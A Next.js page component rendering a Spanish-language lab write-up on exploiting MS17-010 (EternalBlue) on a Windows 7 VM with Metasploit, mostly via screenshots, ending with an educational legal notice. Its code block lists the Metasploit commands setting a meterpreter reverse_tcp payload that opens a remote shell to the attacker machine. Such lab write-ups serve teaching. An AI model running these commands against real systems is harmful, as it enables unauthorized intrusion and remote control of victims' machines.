'use client';

import React, { useEffect } from 'react';
import Image from 'next/image';

export default function MetasploitLab() {
  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  return (
    <div className="container py-8 px-4 mx-auto max-w-4xl">
      {/* Encabezado */}
      <h1 className="text-3xl md:text-4xl font-bold mb-6 text-center">
        Explotación de Vulnerabilidades en Windows con Metasploit
      </h1>

      {/* Objetivo Principal */}
      <div className="bg-card rounded-lg p-6 mb-8 shadow-lg">
        <h2 className="text-2xl font-semibold mb-4">Objetivo Principal</h2>
        <p className="text-muted-foreground text-justify">
          Este laboratorio detalla el proceso de explotación de una vulnerabilidad en un sistema operativo
          Windows 7 utilizando la herramienta Metasploit Framework. El objetivo es demostrar la capacidad
          de identificar, explotar y obtener acceso a un sistema vulnerable, así como realizar acciones
          post-explotación.
        </p>
      </div>

      {/* Configuración del Entorno */}
      <div className="mb-8">
        <h2 className="text-2xl font-semibold mb-4">1. Configuración del Entorno</h2>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div className="bg-card p-6 rounded-lg">
            <h3 className="text-xl font-semibold mb-2">Máquina Atacante</h3>
            <ul className="list-disc pl-6 space-y-2 text-muted-foreground">
              <li>Sistema Operativo: Kali Linux</li>
              <li>Herramientas: Metasploit Framework</li>
              <li>IP: 192.168.88.128</li>
            </ul>
          </div>
          <div className="bg-card p-6 rounded-lg">
            <h3 className="text-xl font-semibold mb-2">Máquina Víctima</h3>
            <ul className="list-disc pl-6 space-y-2 text-muted-foreground">
              <li>Sistema Operativo: Windows 7 Ultimate SP1</li>
              <li>Versión: 6.1.7601</li>
              <li>IP: 192.168.88.129</li>
            </ul>
          </div>
        </div>
      </div>

      {/* Reconocimiento de Red */}
      <div className="space-y-8">
        <h2 className="text-2xl font-semibold mb-4">2. Reconocimiento de la Red</h2>
        <p className="text-muted-foreground mb-4">
          Verificación de conectividad entre la máquina atacante y la víctima:
        </p>

        <div className="grid grid-cols-1 gap-6">
          {/* Verificación en Windows */}
          <div>
            <h3 className="text-xl font-semibold mb-2">Verificación en Windows 7 (Víctima)</h3>
            <p className="text-muted-foreground mb-4">
              Obtenemos la dirección IP del sistema usando ipconfig:
            </p>
            <Image
              src="/lab1/metasploit/2.png"
              alt="Configuración IP de Windows"
              width={800}
              height={450}
              className="rounded-lg shadow-md mb-4"
            />
          </div>

          {/* Verificación en Kali */}
          <div>
            <h3 className="text-xl font-semibold mb-2">Verificación en Kali Linux (Atacante)</h3>
            <div className="space-y-4">
              <div>
                <p className="text-muted-foreground mb-2">Iniciando msfconsole:</p>
                <Image
                  src="/lab1/metasploit/0.png"
                  alt="Inicio de msfconsole"
                  width={800}
                  height={450}
                  className="rounded-lg shadow-md mb-4"
                />
              </div>

              <div>
                <p className="text-muted-foreground mb-2">Verificación de red y conectividad:</p>
                <Image
                  src="/lab1/metasploit/3.png"
                  alt="Verificación de red"
                  width={800}
                  height={450}
                  className="rounded-lg shadow-md mb-4"
                />
              </div>
            </div>
          </div>
        </div>

        {/* Explotación */}
        <div>
          <h2 className="text-2xl font-semibold mb-4">3. Explotación de la Vulnerabilidad MS17-010 (EternalBlue)</h2>
          <p className="text-muted-foreground mb-4">
            Configuración y ejecución del exploit EternalBlue:
          </p>
          <div className="space-y-6">
            <div>
              <h3 className="text-xl font-semibold mb-2">Configuración del Exploit</h3>
              <Image
                src="/lab1/metasploit/configuramos el exploit.png"
                alt="Configuración del exploit"
                width={800}
                height={450}
                className="rounded-lg shadow-md mb-4"
              />
              <div className="bg-muted p-4 rounded-md mb-4">
                <pre className="text-sm">
                  <code>
                    use exploit/windows/smb/ms17_010_eternalblue{'\n'}
                    set RHOSTS 192.168.88.129{'\n'}
                    set LHOST 192.168.88.128{'\n'}
                    set payload windows/x64/meterpreter/reverse_tcp{'\n'}
                    exploit
                  </code>
                </pre>
              </div>
            </div>

            <div>
              <h3 className="text-xl font-semibold mb-2">Ejecución Exitosa</h3>
              <Image
                src="/lab1/metasploit/exploit listo para usar.png"
                alt="Exploit ejecutado con éxito"
                width={800}
                height={450}
                className="rounded-lg shadow-md mb-4"
              />
            </div>
          </div>
        </div>

        {/* Post-Explotación */}
        <div>
          <h2 className="text-2xl font-semibold mb-4">4. Post-Explotación</h2>
          <p className="text-muted-foreground mb-4">
            Acciones realizadas después de obtener acceso al sistema:
          </p>
          <div className="space-y-6">
            <div>
              <h3 className="text-xl font-semibold mb-2">Información del Sistema</h3>
              <Image
                src="/lab1/metasploit/lanzamos el primer ataque para ver la info del sistema.png"
                alt="Información del sistema"
                width={800}
                height={450}
                className="rounded-lg shadow-md mb-4"
              />
            </div>

            <div>
              <h3 className="text-xl font-semibold mb-2">Captura de Pantalla Remota</h3>
              <Image
                src="/lab1/metasploit/segundo ataque, screenshot, pantallazo a la pantalla del equipo de la victima.png"
                alt="Captura de pantalla del sistema víctima"
                width={800}
                height={450}
                className="rounded-lg shadow-md mb-4"
              />
            </div>

            <div>
              <h3 className="text-xl font-semibold mb-2">Shell del Sistema</h3>
              <Image
                src="/lab1/metasploit/tercer ataque, shell,escalamiento de privilegios.png"
                alt="Shell del sistema"
                width={800}
                height={450}
                className="rounded-lg shadow-md mb-4"
              />
            </div>
          </div>
        </div>

        {/* Aviso Legal */}
        <div className="bg-destructive/10 p-6 rounded-lg mt-8">
          <h4 className="text-lg font-semibold mb-2 text-destructive">⚠️ Aviso Legal Importante</h4>
          <p className="text-muted-foreground">
            Este laboratorio debe realizarse únicamente en un entorno controlado y con permiso explícito.
            La explotación no autorizada de sistemas puede tener graves consecuencias legales. El objetivo
            es puramente educativo para comprender el funcionamiento de las vulnerabilidades y mejorar las
            defensas de los sistemas.
          </p>
        </div>
      </div>
    </div>
  );
}
